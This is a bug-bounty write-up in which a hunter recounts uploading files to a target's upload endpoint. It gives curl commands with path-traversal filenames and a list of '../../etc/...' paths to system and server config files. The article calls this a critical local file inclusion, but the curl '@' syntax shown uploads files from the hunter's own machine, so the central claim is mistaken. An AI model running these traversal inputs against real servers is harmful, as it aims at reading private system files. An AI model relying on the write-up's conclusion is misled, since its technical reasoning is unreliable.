# How I Found My First Critical Bug Bounty | Unauthenticated Arbitrary File Upload Lead To LFI via…

- **Source URL:** https://medium.com/@terp0x0/how-i-found-my-first-critical-bug-bounty-unauthenticated-arbitrary-file-upload-lead-to-lfi-via-5f33c80fc44f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905074825/https://medium.com/@terp0x0/how-i-found-my-first-critical-bug-bounty-unauthenticated-arbitrary-file-upload-lead-to-lfi-via-5f33c80fc44f?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10027 (id 10027)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Found My First Critical Bug Bounty | Unauthenticated Arbitrary File Upload Lead To LFI via Path Traversal 🐞

**Hi** hackers,


**Hope you’re doing well!**

I am **Abdulrahman terp0x0** junior penetration tester and bug bounty hunter .

Today I want to share my bug bounty journey and how I found my first critical bug. 🎯

I remember when I started bug bounty hunting, I expected that I would get my first bounty after one week — or two weeks at most.

**But of course, that didn’t happen**.

Today, after almost **three** months of hunting and submitting around **twelve** reports, most of them marked as *informative or duplicates*,

**I finally got my first bounty.**

I think the two most important areas you should focus on after learning the basics are:

**1.Real-world hacking**

**2.Reading writeups and following other bug hunters**

## **Real-world hacking**

Real-world hacking gives you real experience, and it’s the best way to learn. You’ll face many challenges and scenarios you would never

see in simulated labs — it’s completely different. **“Hack to learn, not learn to hack.”**

For example, when you practice on PortSwigger Academy, you already know there’s a vulnerability. All you have to do is find it.

But when you hunt real targets, you don’t know where to go or what you’re even looking for.

It requires a different mindset and a different methodology.

## **Reading writeups**

Reading writeups and following other hunters is a very important step. This also gives you real-world insight and helps you understand how others approach targets and think outside the box.

This played a big role in helping me find my first bug.

## **Let it be….. Lets start**

Let’s say the target domain is: *https://example.com.*

After doing the usual subdomain enumeration, I found the subdomain:

*autos.example.com.*

Most of the time I use the **dirsearch** tool for **content discovery**, and it gave me this interesting endpoint:

*autos.example.com/fileupload*.

This caught my attention because if I could upload a malicious file, it could potentially lead to **Remote Code Execution (RCE).**

**Uploading a File**


The next step was to try uploading a file. I used the following command:

*curl -X POST https://autos.example.com/fileupload/ \*

*-F “file=@test.txt”*

The file was successfully uploaded, and the server returned the following URL:

*https://412xxxxx.cdn.bubble.io/f1xxxxxxx/test.txt*

This file was publicly accessible from the browser.

💥 **Attempting RCE**

After successfully uploading, I attempted to execute malicious code to perform Remote Code Execution (RCE).

Unfortunately, there was no server-side execution. .php files are treated as static content, meaning they are not parsed or executed by the server.

**Local File Inclusion (LFI) via Crafted Upload**


Then I tried another approach — LFI through path traversal in the filename.

I used the following command:

*curl -X POST https://autos.example.com/fileupload/ \*

*-F “file=@../../../../../../../etc/passwd”*

Most of the time, you don’t know exactly how many ../ are needed to achieve LFI, so you need to try multiple levels until it works. This attempt returned the following URL:

*https://41xxxxx.cdn.bubble.io/xxxxx/passwd*

**This confirmed a critical LFI through filename-based path traversal during upload.**

🔓 **Increasing the Impact**

I didn’t stop there. To increase the impact, I attempted to access more sensitive files — and was successfully able to upload and access the following:

../../../../../../../etc/passwd

../../../../../../../etc/group

../../../../../../../etc/hosts

../../../../../../../etc/hostname

../../../../../../../etc/resolv.conf

../../../../../../../etc/fstab

../../../../../../../etc/profile

../../../../../../../etc/issue

../../../../../../../etc/nginx/nginx.conf

../../../../../../../etc/mysql/mariadb.conf.d/50-server.cnf

Finally, I hope you’ve benefited from reading this writeup.

Thank you!

**follow me :**
